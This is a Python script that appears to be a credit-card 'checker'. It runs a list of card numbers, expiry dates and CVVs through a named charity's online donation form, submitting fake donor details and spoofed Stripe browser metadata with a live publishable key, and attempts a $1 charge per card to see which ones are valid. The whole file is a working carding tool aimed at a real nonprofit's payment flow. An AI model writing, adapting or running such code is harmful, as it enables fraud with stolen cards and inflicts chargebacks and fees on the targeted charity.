import sys
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
import asyncio
import httpx
import time
import json
import uuid
import random

async def test_cards(card_list):
    headers_base = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    }

    for card_str in card_list:
        cc, mes, ano, cvv = [p.strip() for p in card_str.split('|')[:4]]
        if len(ano) == 2:
            ano = "20" + ano
        mes = mes.zfill(2)

        async with httpx.AsyncClient(follow_redirects=True, verify=False, timeout=25.0) as client:
            # 1 & 2 Init
            await client.post("https://www.abaana.org/donate/online", data={"form[name]": "Gabriel Rosa", "form[line1]": "123 Allen ST", "form[city]": "New York", "form[county]": "New York", "form[postcode]": "10002", "form[country]": "USA", "form[phone]": "18019632580", "form[email]": "johndoe9981@gmail.com", "extras[informed]": "no", "stepValue": "1"}, headers=headers_base)
            await client.post("https://www.abaana.org/donate/online/step2", data={"paymentMethod": "card", "currency": "USD", "amount": "1", "project": "Any Project", "addFee": "0", "adminFee": "", "stepValue": "2"}, headers=headers_base)

            # 3 Tokenize
            stripe_data = {
                'type': 'card',
                'billing_details[name]': 'Gabriel Rosa',
                'billing_details[email]': 'johndoe9981@gmail.com',
                'billing_details[address][country]': 'US',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_month]': mes,
                'card[exp_year]': ano,
                'allow_redisplay': 'unspecified',
                'payment_user_agent': 'stripe.js/f4aa9d6f0f; stripe-js-v3/f4aa9d6f0f; payment-element; deferred-intent',
                'referrer': 'https://www.abaana.org/donate/online',
                'time_on_page': str(random.randint(100000, 999999)),
                'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': str(uuid.uuid4()),
                'muid': str(uuid.uuid4()),
                'sid': str(uuid.uuid4()),
                'key': 'pk_live_51LhtwiGPgaK6ulcPEN1I001VvS0Ke0SlidIqaDopfpahumzL2zhNQsfb8xI4QxelHGy4BbN2Va3hTEK7dtCkbfTO000GXTCC6H',
                '_stripe_version': '2024-06-20'
            }
            r3 = await client.post("https://api.stripe.com/v1/payment_methods", data=stripe_data, headers={'authority': 'api.stripe.com', 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/'})
            t3 = r3.json()
            pm = t3.get("id")
            if not pm:
                print(f"[-] {card_str} -> Tokenize error: {t3}")
                continue

            # 4 Confirm
            await client.post("https://www.abaana.org/donate/online/confirm", data={"do": "donate/online/step3", "stripeToken": pm, "addGiftAid": "0", "gift-aid": "0", "cardholder-name": "Gabriel Romero", "stepValue": "3"}, headers=headers_base)

            # 5 Execute PaymentIntent
            r6 = await client.post("https://www.abaana.org/stripe-payment-intent", json={"payment_method_id": pm, "site_area": "donation"}, headers=headers_base)
            print(f"[+] {card_str} -> {r6.text}")

if __name__ == '__main__':
    cards = [
        "4000001234567890|12|28|123",
        "4111111111111111|05|27|999",
        "5424180012345678|04|29|456"
    ]
    asyncio.run(test_cards(cards))
